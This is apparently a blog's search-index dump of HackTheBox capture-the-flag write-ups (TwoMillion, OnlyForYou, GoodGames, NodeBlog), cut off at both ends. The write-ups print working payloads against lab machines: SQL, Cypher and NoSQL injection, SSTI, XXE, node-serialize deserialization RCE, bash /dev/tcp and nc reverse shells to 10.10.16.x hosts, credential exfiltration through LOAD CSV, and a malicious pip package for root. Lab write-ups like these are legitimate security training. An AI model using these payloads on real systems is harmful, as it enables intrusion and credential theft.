Trick"},{"categories":null,"contents":"TwoMillion Enumeration nmap └─$ nmap -Pn -p- 10.10.11.221 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 17:29 BST Warning: 10.10.11.221 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.221 (10.10.11.221) Host is up (0.15s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80 -sC -sV 10.10.11.221 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 18:08 BST Nmap scan report for 10.10.11.221 (10.10.11.221) Host is up (0.15s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx |_http-title: Did not follow redirect to http://2million.htb/ Web server gobuster └─$ gobuster dir -u http://2million.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error --exclude-length 162 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://2million.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 162 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/31 18:37:36 Starting gobuster in directory enumeration mode =============================================================== /home (Status: 302) [Size: 0] [--\u0026gt; /] /login (Status: 200) [Size: 3704] /register (Status: 200) [Size: 4527] /api (Status: 401) [Size: 0] /logout (Status: 302) [Size: 0] [--\u0026gt; /] /404 (Status: 200) [Size: 1674] /Database.php (Status: 200) [Size: 0] /0404 (Status: 200) [Size: 1674] /invite (Status: 200) [Size: 3859] /Router.php (Status: 200) [Size: 0] vhosts └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://2million.htb/\u0026#39; -H \u0026#39;Host: FUZZ.2million.htb\u0026#39; -fs 162 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://2million.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.2million.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 162 ________________________________________________ :: Progress: [19966/19966] :: Job [1/1] :: 187 req/sec :: Duration: [0:01:10] :: Errors: 0 :: Foothold http://2million.htb/invite We find inviteapi.js in the sources Send it to https://beautifier.io/ Let\u0026rsquo;s try calling makeInviteCode() It returns message encrypted by ROT13 I used CyberChef to decrypt it Okay, now we know what we have to do as the next step Send POST request to /api/v1/invite/generate Sending POST message to specified api results in base64 encoded code Use it to register and log in We had /api endpoint from gobuster results which returned 401 code Now we can see all api endpoints We don\u0026rsquo;t have admin privileges Thus we can\u0026rsquo;t generate vpn But we receive 200 response code for /api/v1/admin/settings/update We change Content-Type to application/json We receive error indicating that email parameter is missing We add email parameter Another error with missing is_admin parameter We set is_admin to true But it says it has to be either 1 or 0 So we set it to 1 It seems like it was succesfull If we check again /api/v1/admin/auth route, it returns true Now let\u0026rsquo;s generate a vpn Just like before, it requires Content-Type: application/json And username parameter If we did everything correctly, we receive response with our vpn file Okay, here I simply tried command injection on username parameter and it worked I thought they could generate ovpn file like in this post For example, ./make_config.sh \u0026lt;username\u0026gt; And command injection worked Since we have rce, we got our reverse shell User admin user www-data@2million:~/html$ ls -lha /home total 12K drwxr-xr-x 3 root root 4.0K Jun 6 10:22 . drwxr-xr-x 19 root root 4.0K Jun 6 10:22 .. drwxr-xr-x 4 admin admin 4.0K Jun 6 10:22 admin www-data@2million:~/html$ find / -user admin 2\u0026gt;/dev/null /home/admin /home/admin/.cache /home/admin/.ssh /home/admin/.profile /home/admin/.bash_logout /home/admin/.bashrc /var/mail/admin www-data@2million:~/html$ find / -user admin -ls 2\u0026gt;/dev/null 80942 4 drwxr-xr-x 4 admin admin 4096 Jun 6 10:22 /home/admin 80949 4 drwx------ 2 admin admin 4096 Jun 6 10:22 /home/admin/.cache 80948 4 drwx------ 2 admin admin 4096 Jun 6 10:22 /home/admin/.ssh 80943 4 -rw-r--r-- 1 admin admin 807 May 26 22:53 /home/admin/.profile 80944 4 -rw-r--r-- 1 admin admin 220 May 26 22:53 /home/admin/.bash_logout 80945 4 -rw-r--r-- 1 admin admin 3771 May 26 22:53 /home/admin/.bashrc 271 4 -rw-r--r-- 1 admin admin 540 Jun 2 23:20 /var/mail/admin Let\u0026rsquo;s check /var/mail/admin From: ch4p \u0026lt;ch4p@2million.htb\u0026gt; To: admin \u0026lt;admin@2million.htb\u0026gt; Cc: g0blin \u0026lt;g0blin@2million.htb\u0026gt; Subject: Urgent: Patch System OS Date: Tue, 1 June 2023 10:45:22 -0700 Message-ID: \u0026lt;9876543210@2million.htb\u0026gt; X-Mailer: ThunderMail Pro 5.2 Hey admin, I\u0026#39;m know you\u0026#39;re working as fast as you can to do the DB migration. While we\u0026#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can\u0026#39;t get popped by that. HTB Godfather Let\u0026rsquo;s also check /var/www/html for config files, in case there are credentials www-data@2million:~/html$ grep -irl \u0026#34;password\u0026#34; . ./.env ./index.php ./js/htb-backend.min.js ./js/htb-frontpage.min.js ./js/htb-frontend.min.js ./views/register.php ./views/login.php ./controllers/AuthController.php www-data@2million:~/html$ cat .env DB_HOST=127.0.0.1 DB_DATABASE=htb_prod DB_USERNAME=admin DB_PASSWORD=SuperDuperPass123 su to admin using creds above works We can also ssh www-data@2million:~/html$ su admin Password: To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. admin@2million:/var/www/html$ Root We saw a hint from email Let\u0026rsquo;s get box info and then google admin@2million:~$ uname -a Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux admin@2million:~$ cat /etc/*release DISTRIB_ID=Ubuntu DISTRIB_RELEASE=22.04 DISTRIB_CODENAME=jammy DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 22.04.2 LTS\u0026#34; PRETTY_NAME=\u0026#34;Ubuntu 22.04.2 LTS\u0026#34; NAME=\u0026#34;Ubuntu\u0026#34; VERSION_ID=\u0026#34;22.04\u0026#34; VERSION=\u0026#34;22.04.2 LTS (Jammy Jellyfish)\u0026#34; VERSION_CODENAME=jammy ID=ubuntu ID_LIKE=debian HOME_URL=\u0026#34;https://www.ubuntu.com/\u0026#34; SUPPORT_URL=\u0026#34;https://help.ubuntu.com/\u0026#34; BUG_REPORT_URL=\u0026#34;https://bugs.launchpad.net/ubuntu/\u0026#34; PRIVACY_POLICY_URL=\u0026#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\u0026#34; UBUNTU_CODENAME=jammy Potential CVE-2023-0386 Looks like it was fixed in 5.15.0-70.77, which was published in 22 March 2023 We have 5.15.70-051570-generic compiled in Sep 23 13:45:37 UTC 2022 Worth trying We have a POC with instructions Download the zip Unzip it and follow the instructions The session hangs Run exploit from another session And we are root ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/twomillion/images/twomillion.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/twomillion/","summary":"TwoMillion Enumeration nmap └─$ nmap -Pn -p- 10.10.11.221 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 17:29 BST Warning: 10.10.11.221 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.221 (10.10.11.221) Host is up (0.15s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80 -sC -sV 10.10.11.221 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 18:08 BST Nmap scan report for 10.","tags":["HTB","php","ubuntu","javascript","api","command-injection","cve-2023-0386","cyberchef"],"title":"[HTB] Machine: TwoMillion"},{"categories":null,"contents":"OnlyForYou Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -p- -Pn 10.10.11.210 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 16:45 BST Nmap scan report for 10.10.11.210 (10.10.11.210) Host is up (0.15s latency). Not shown: 65519 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 1249.23 seconds ┌──(kali㉿kali)-[~] └─$ nmap -p22,80 -sC -sV -Pn 10.10.11.210 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 17:08 BST Nmap scan report for 10.10.11.210 (10.10.11.210) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e883e0a9fd43df38198aaa35438411ec (RSA) | 256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA) |_ 256 445f7aa377690a77789b04e09f11db80 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://only4you.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.46 seconds Web Server Found a vhost ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://only4you.htb/' -H 'Host: FUZZ.only4you.htb' gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://beta.only4you.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://beta.only4you.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/25 17:33:53 Starting gobuster in directory enumeration mode =============================================================== /download (Status: 405) [Size: 683] /source (Status: 200) [Size: 12127] /list (Status: 200) [Size: 5934] /convert (Status: 200) [Size: 2760] /resize (Status: 200) [Size: 2984] Progress: 20734 / 26585 (77.99%)[ERROR] 2023/05/25 17:38:42 [!] parse \u0026#34;http://beta.only4you.htb/error\\x1f_log\u0026#34;: net/url: invalid control character in URL Progress: 26584 / 26585 (100.00%) =============================================================== 2023/05/25 17:40:03 Finished =============================================================== Foothold If we visit beta.only4you.htb we can download the source code Download it and analyze We have a possbile lfi Testing proves it Let\u0026rsquo;s check if there are other vhosts We have a location of our application in /var/www/only4you.htb/ Open a source file We can use wfuzz or just guess it and tryapp.py wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt -u http://beta.only4you.htb/download -X POST -d \u0026quot;image=/var/www/only4you.htb/FUZZ.FUZ2Z\u0026quot; Let\u0026rsquo;s check form.py since it is included in app.py We have a possible command injection but we need to bypass regex check re.match checks only the start of the string So we can append our command The request Let\u0026rsquo;s append ;curl http://10.10.16.48:8000 or ;ping -c 1 10.10.16.48 to email parameter Start webserver or tcpdump and send request And we have a connection Let\u0026rsquo;s get revshell User Enumerate We have interesting ports 7687, 7474, 8001, 3000 tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8001 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 1049/nginx: worker tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 127.0.0.1:7687 :::* LISTEN - tcp6 0 0 127.0.0.1:7474 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - I uploaded chisel and started remote port forwarding Note: the screenshots only show 7687, 7474 I forgot to take screenshots when I added other ports Port 3000 Gogs Port 8001 Dashboards Trying default creds admin:admin works If we look closely, we see tasks Migrated to new database(neo4j) So we need to play with neo4j Port 7474 neo4j Neo4j is a graph based database It uses Cypher as query language and has a documentation to get familiar with it https://neo4j.com/developer/cypher/querying/ Googling shows that we can try Cypher Injections https://neo4j.com/developer/kb/protecting-against-cypher-injection/ https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#get-labels Dashboards (port 8001) had Employee page If we play around with search, we have our injection By playing around with payloads I eventually managed to get password Note, screen shows only one password (I had to reset the box to get john hash) The following query had better results (props to 0xdf) ' match (u:user) with distinct u.username + \u0026quot;:\u0026quot; + u.password as d LOAD CSV FROM 'http://10.10.16.48/?'+d as a return a // Now we can ssh as john Root Enumerate sudo -l It looks like john can download any repository from Gogs If we try john\u0026rsquo;s creds to login to Gogs, they work Potential privilege escalation is to create a malicious package and download it to execute arbitrary code. https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/ https://medium.com/checkmarx-security/automatic-execution-of-code-upon-package-download-on-python-package-manager-cd6ed9e366a8 https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/ Now we jsut have to follow the steps We need to download https://github.com/wunderwuzzi23/this_is_fine_wuzzi And modify the setup.py and then build it via python3 -m build Create repository and upload tar from dist directory that was created after build Or we can create a repo and publish it as john with tar in it (which is what I did) Now download via sudo My malicious package added suid bit to bash We are root ","date":"August 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/images/onlyforyou.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/","summary":"OnlyForYou Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -p- -Pn 10.10.11.210 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 16:45 BST Nmap scan report for 10.10.11.210 (10.10.11.210) Host is up (0.15s latency). Not shown: 65519 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 1249.23 seconds ┌──(kali㉿kali)-[~] └─$ nmap -p22,80 -sC -sV -Pn 10.10.11.210 -T4 Starting Nmap 7.","tags":["HTB","ffuf","vhost","subdomain","flask","source-code","file-read","directory-traversal","python-re","command-injection","chisel","gogs","neo4j","cypher-injection","cypher","crackstation","pip","setup-py"],"title":"[HTB] Machine: OnlyForYou"},{"categories":null,"contents":"GoodGames Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.130 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 19:43 BST Nmap scan report for 10.10.11.130 (10.10.11.130) Host is up (0.14s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.51 |_http-title: GoodGames | Community and Store |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 Service Info: Host: goodgames.htb Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.73 seconds gobuster └─$ gobuster dir -u http://goodgames.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --exclude-length 9265 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://goodgames.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 9265 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/21 19:51:04 Starting gobuster in directory enumeration mode =============================================================== /blog (Status: 200) [Size: 44212] /login (Status: 200) [Size: 9294] /profile (Status: 200) [Size: 9267] /signup (Status: 200) [Size: 33387] /logout (Status: 302) [Size: 208] [--\u0026gt; http://goodgames.htb/] /forgot-password (Status: 200) [Size: 32744] No vhosts were found by ffuf\nWeb server\nFoothold Let\u0026rsquo;s register a user Trying SQLI on request If we click gear icon in admin\u0026rsquo;s profile page we are redirected to http://internal-administration.goodgames.htb/ Let\u0026rsquo;s dump the data from database using SQLI, maybe we get lucky and get password email=' union select 1,2,3,database()-- -\u0026amp;password=test - Current database email=' union select 1,2,3,concat(schema_name,':') from information_schema.schemata-- -\u0026amp;password=test - List databases email=' union select 1,2,3,concat(table_name,':') from information_schema.tables where table_schema='main'-- -\u0026amp;password=test - List tables in main database email=' union select 1,2,3,concat(column_name,':') from information_schema.columns where table_name='user'-- -\u0026amp;password=test - List columns names in user table email=' union select 1,2,3,concat(id,':',name,':',password) from user-- -\u0026amp;password=test - Dump user table admin:2b22337f218b2d82dfc3b6f77e7cb8ec Let\u0026rsquo;s crack it admin:superadministrator Creds work for http://internal-administration.goodgames.htb/ We can change username Since it\u0026rsquo;s a flask application, it could be vulnerable to SSTI Let\u0026rsquo;s try id command to test for rce {{ namespace.__init__.__globals__.os.popen('id').read() }} Let\u0026rsquo;s get reverse shell {{ namespace.__init__.__globals__.os.popen('bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.5/6666 0\u0026gt;\u0026amp;1\u0026quot;').read() }} It looks like a container We can upgrade the shell via: script /dev/null -c bash python3 -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;);' User Enumerate the container root@3a453ab39d3d:/home/augustus# ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 5: eth0@if6: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0 valid_lft forever preferred_lft forever I found flag in augustus home directory, yet there is no such user in container root@3a453ab39d3d:/home/augustus# cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false It could be that the directory is mounted root@3a453ab39d3d:/home/augustus# mount ... /dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro) ... We can try to guess and ping 172.19.0.1 to see if it\u0026rsquo;s reachable or for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep \u0026quot;bytes from\u0026quot; \u0026amp;); done; root@3a453ab39d3d:/home/augustus# for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep \u0026#34;bytes from\u0026#34; \u0026amp;); done; 64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.111 ms 64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.044 ms Now let\u0026rsquo;s port scan for i in {1..65535}; do echo \u0026gt; /dev/tcp/172.19.0.1/$i \u0026amp;\u0026amp; echo \u0026quot;$i open\u0026quot;; done 2\u0026gt;/dev/null root@3a453ab39d3d:/home/augustus# for i in {1..65535}; do echo \u0026gt; /dev/tcp/172.19.0.1/$i \u0026amp;\u0026amp; echo \u0026#34;$i open\u0026#34;; done 2\u0026gt;/dev/null 22 open 80 open Root During the enumeration I found nothing except the fact that I can create files in augustus directory from both container and host Moreover the permissions are set root when files are created from container So we can copy bash binary and try to set suid bit from container ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/goodgames/images/goodgames.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/goodgames/","summary":"GoodGames Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.130 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 19:43 BST Nmap scan report for 10.10.11.130 (10.10.11.130) Host is up (0.14s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.51 |_http-title: GoodGames | Community and Store |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 Service Info: Host: goodgames.htb Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB","vhosts","sqli","sqli-bypass","sqli-union","ssti","docker escape","docker-mount"],"title":"[HTB] Machine: GoodGames"},{"categories":null,"contents":"NodeBlog Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -p- -Pn 10.10.11.139 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 20:10 BST Nmap scan report for 10.10.11.139 (10.10.11.139) Host is up (0.20s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 5000/tcp open upnp └─$ nmap -p22,5000 -sC -sV -Pn 10.10.11.139 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 20:30 BST Nmap scan report for 10.10.11.139 (10.10.11.139) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 5000/tcp open http Node.js (Express middleware) |_http-title: Blog Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds Web Server gobuster └─$ gobuster dir -u http://10.10.11.139:5000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.139:5000 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/23 20:32:12 Starting gobuster in directory enumeration mode =============================================================== /login (Status: 200) [Size: 1002] /Login (Status: 200) [Size: 1002] Foothold/User We see the login page Let\u0026rsquo;s play with it Trying SQLI had no result So let\u0026rsquo;s also try NoSQLI If we test for json version of Authentication Bypass in NoSQLI we have a hit We need to change Content-Type to applicaiton/json And used the payload: {\u0026quot;user\u0026quot;: {\u0026quot;$ne\u0026quot;: null}, \u0026quot;password\u0026quot;: {\u0026quot;$ne\u0026quot;: null}} We can either intercept and change the headers Or send the request to Repeater, get auth cookie and set it in the browser to continue There\u0026rsquo;s an Upload option, if we click it and select any file, it returns error with a path /articles/xml Browser treats tags as HTML Create a test xml file and upload it \u0026lt;post\u0026gt; \u0026lt;title\u0026gt;TEST\u0026lt;/title\u0026gt; \u0026lt;description\u0026gt;TEST\u0026lt;/description\u0026gt; \u0026lt;markdown\u0026gt; ## TEST Test \u0026lt;/markdown\u0026gt; \u0026lt;/post\u0026gt; And it works Let;s try XXE We can test the payloads from PayloadAllTheThings Make sure to craft payload into the format the site expects We can set every field to entity \u0026amp;file and the payload works for all of them \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE data [ \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;post\u0026gt; \u0026lt;title\u0026gt;\u0026amp;file;\u0026lt;/title\u0026gt; \u0026lt;description\u0026gt;\u0026amp;file;\u0026lt;/description\u0026gt; \u0026lt;markdown\u0026gt; \u0026amp;file; \u0026lt;/markdown\u0026gt; \u0026lt;/post\u0026gt; So I was stuck here for a while, until I made a mistake in json while sending /login info and I got an error message So now we know that the app is running in /opt/blog We need to test for app.js, server.js, main.js (Basic files for frameworks) Let\u0026rsquo;s analyze it const express = require(\u0026amp;#39;express\u0026amp;#39;) const mongoose = require(\u0026amp;#39;mongoose\u0026amp;#39;) const Article = require(\u0026amp;#39;./models/article\u0026amp;#39;) const articleRouter = require(\u0026amp;#39;./routes/articles\u0026amp;#39;) const loginRouter = require(\u0026amp;#39;./routes/login\u0026amp;#39;) const serialize = require(\u0026amp;#39;node-serialize\u0026amp;#39;) const methodOverride = require(\u0026amp;#39;method-override\u0026amp;#39;) const fileUpload = require(\u0026amp;#39;express-fileupload\u0026amp;#39;) const cookieParser = require(\u0026amp;#39;cookie-parser\u0026amp;#39;); const crypto = require(\u0026amp;#39;crypto\u0026amp;#39;) const cookie_secret = \u0026amp;#34;UHC-SecretCookie\u0026amp;#34; //var session = require(\u0026amp;#39;express-session\u0026amp;#39;); const app = express() mongoose.connect(\u0026amp;#39;mongodb://localhost/blog\u0026amp;#39;) app.set(\u0026amp;#39;view engine\u0026amp;#39;, \u0026amp;#39;ejs\u0026amp;#39;) app.use(express.urlencoded({ extended: false })) app.use(methodOverride(\u0026amp;#39;_method\u0026amp;#39;)) app.use(fileUpload()) app.use(express.json()); app.use(cookieParser()); //app.use(session({secret: \u0026amp;#34;UHC-SecretKey-123\u0026amp;#34;})); function authenticated(c) { if (typeof c == \u0026amp;#39;undefined\u0026amp;#39;) return false c = serialize.unserialize(c) if (c.sign == (crypto.createHash(\u0026amp;#39;md5\u0026amp;#39;).update(cookie_secret + c.user).digest(\u0026amp;#39;hex\u0026amp;#39;)) ){ return true } else { return false } } app.get(\u0026amp;#39;/\u0026amp;#39;, async (req, res) =\u0026amp;gt; { const articles = await Article.find().sort({ createdAt: \u0026amp;#39;desc\u0026amp;#39; }) res.render(\u0026amp;#39;articles/index\u0026amp;#39;, { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) }) }) app.use(\u0026amp;#39;/articles\u0026amp;#39;, articleRouter) app.use(\u0026amp;#39;/login\u0026amp;#39;, loginRouter) app.listen(5000) So the node-serialize looks interesting, since improper deserialization could lead to bad things https://portswigger.net/web-security/deserialization And we have a payload We know that our cookie is a url-encoded json Let\u0026rsquo;s try it {\u0026quot;rce\u0026quot;:\u0026quot;_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.16.5', function(error,stdout, stderr) { console.log(stdout) });}()\u0026quot;} Encode as url and send it Since we got rce, let\u0026rsquo;s get a shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.5 6666 \u0026gt;/tmp/f By the way, there was another trick to get a shell We encode revshell payload as base64 echo 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.5/6666 0\u0026gt;\u0026amp;1' | base64 And in the payload itself add it as: echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzY2NjYgMD4mMQo= | base64 -d| bash I couldn\u0026rsquo;t read the user flag from /home/admin since it didnt have x permissions set But admin is the owner of the folder, we can set permissions run chmod +x /home/admin and get the flag Root Enumerate We don\u0026rsquo;t have password to check sudo rights No groups We have mongodb running on port 27017 Let\u0026rsquo;s enumerate it admin:IppsecSaysPleaseSubscribe Another way to do it is by using mongodump and bsondump sudo ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/nodeblog/images/nodeblog.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/nodeblog/","summary":"NodeBlog 